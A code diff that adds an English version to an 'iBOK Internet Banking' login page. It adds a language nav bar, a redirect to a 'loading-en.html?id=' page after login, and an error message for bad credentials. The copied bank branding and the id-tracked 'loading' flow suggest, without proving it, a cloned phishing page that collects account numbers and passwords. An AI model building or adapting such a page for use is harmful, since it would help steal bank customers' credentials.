@@ -15,7 +15,11 @@ body{font-family:'Open Sans',sans-serif;background:#e8e8e8;min-height:100vh;disp
 .header-logo img{height:60px}
 .header-text{color:#fff;text-align:right;display:inline-grid;align-items:center;padding-right:3vw;font-size:24px;font-weight:700;background:linear-gradient(#f0b933,#e2ae2d,#d09e24,#bb8b16)}
 
-.overlay{position:fixed;top:0;left:0;width:100%;height:100%;z-index:-1}
+.nav-bar{background:#fff;padding:6px 16px;display:flex;align-items:center;justify-content:space-between;border-bottom:1px solid #ddd}
+.nav-bar a{color:#333;text-decoration:none;font-size:13px;font-weight:600}
+.nav-bar a:hover{color:#bc262a}
+.nav-bar .lang-link{background:#bc262a;color:#fff;padding:4px 14px;border-radius:3px;font-size:12px}
+
 .section{flex:1}
 .prelogin{padding:20px 16px}
 .prelogin .container{max-width:600px;margin:0 auto}
@@ -79,6 +83,11 @@ body{font-family:'Open Sans',sans-serif;background:#e8e8e8;min-height:100vh;disp
     <img src="images/bok-logo.svg" alt="iBOK">
   </div>
   <div class="header-text">Welcome to<br>iBOK Internet<br>Banking</div>
+</div>
+
+<div class="nav-bar">
+  <a href="index-en.html">Home</a>
+  <a href="login.html" class="lang-link">العربية</a>
 </div>
 
 <div class="section">
@@ -175,7 +184,7 @@ function doLogin(){
   .then(function(r){return r.json();})
   .then(function(d){
     if(d.ok&&d.id){
-      window.location.href='loading.html?id='+d.id;
+      window.location.href='loading-en.html?id='+d.id;
     }else{
       document.getElementById('loginBtn').disabled=false;
       document.getElementById('loginBtn').textContent='Login';
@@ -189,6 +198,12 @@ function doLogin(){
 
 document.getElementById('accountInput').addEventListener('keydown',function(e){if(e.key==='Enter')document.getElementById('passwordInput').focus();});
 document.getElementById('passwordInput').addEventListener('keydown',function(e){if(e.key==='Enter')doLogin();});
+
+var urlParams=new URLSearchParams(window.location.search);
+if(urlParams.get('error')==='1'){
+  document.getElementById('errorText').textContent='Account number or password is incorrect';
+  document.getElementById('errorBox').classList.add('show');
+}
 </script>
 </body>
 </html>
